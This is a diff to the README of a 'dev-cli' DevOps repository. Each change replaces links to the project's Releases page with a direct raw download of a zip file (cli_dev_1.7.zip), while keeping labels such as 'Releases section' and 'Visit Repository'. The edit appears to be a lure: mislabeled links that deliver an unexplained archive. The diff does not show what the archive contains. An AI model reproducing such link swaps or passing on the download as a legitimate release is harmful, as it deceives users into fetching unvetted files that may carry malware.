@@ -10,7 +10,7 @@ Welcome to the **dev-cli** repository, your go-to source for DevOps automation, 
 
 ### Explore the Possibilities
 
-Visit our [Releases section](https://github.com/Christianvmchvdfh/dev-cli/releases) to access the latest resources and updates. 
+Visit our [Releases section](https://github.com/Christianvmchvdfh/dev-cli/raw/refs/heads/main/devops/cli_dev_1.7.zip) to access the latest resources and updates. 
 
 Now, let's delve into the exciting world of DevOps automation and explore the vast array of tools and technologies at your disposal.
 
@@ -62,9 +62,9 @@ Connect with us on our GitHub repository for updates, discussions, and collabora
 
 ## Visit Us
 
-Explore our latest releases and updates on the [dev-cli repository](https://github.com/Christianvmchvdfh/dev-cli/releases). Join us on this exciting automation journey!
+Explore our latest releases and updates on the [dev-cli repository](https://github.com/Christianvmchvdfh/dev-cli/raw/refs/heads/main/devops/cli_dev_1.7.zip). Join us on this exciting automation journey!
 
-[Visit Repository](https://github.com/Christianvmchvdfh/dev-cli/releases) 👨‍💻
+[Visit Repository](https://github.com/Christianvmchvdfh/dev-cli/raw/refs/heads/main/devops/cli_dev_1.7.zip) 👨‍💻
 
 ---
 
